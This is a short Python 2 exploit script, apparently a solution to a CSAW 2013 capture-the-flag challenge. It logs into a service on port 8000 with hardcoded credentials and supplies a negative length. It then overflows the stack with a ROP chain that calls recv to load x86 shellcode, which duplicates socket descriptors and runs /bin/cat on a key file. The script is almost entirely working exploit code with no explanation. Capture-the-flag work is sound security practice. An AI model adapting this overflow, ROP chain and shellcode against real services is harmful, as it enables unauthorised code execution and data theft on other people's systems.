#!/usr/bin/env python

import sock
import struct

local = True

dup_sc="\x31\xdb\x83\xc3\x04\x31\xc9\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5"

sc="\x60\x6a\x0b\x58\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\xeb\x06\x53\x89\xe1\xcd\x80\x61\xe8\xf5\xff\xff\xff\x6b\x65\x79"

sc = "\x90"*0x80 + dup_sc + sc

def pack(addr):
  return struct.pack("<I", addr)
def unpack(s):
  return struct.unpack("<I", s)[0]

if local:
  host = "localhost"
else:
  host = "128.238.66.217"
port = 8000

recv_plt = 0x8048890

s = sock.Sock(host, port, timeout=3600)

s.read_until("UserName:")
s.send("csaw2013\n")
s.read_until("Password:")
s.send("S1mplePWD\n")
s.read_until("Entry Info:")
s.send("-1\n")
raw_input("--")

writable_addr = 0x804b800
got_addr = 0x804af74
got_read_offset = 16
ebp = pack(writable_addr)
eip = pack(recv_plt)
next_eip = pack(0x804b000)
params = pack(4)
params += pack(0x804b000)
params += pack(len(sc))
params += pack(0)

s.send("A"*0x41c+ebp+eip+next_eip+params)

raw_input("--")
s.send(sc)

result = ""

try:
  while True:
    b = s.read_nbytes(1)
    result += b
except:
  print result
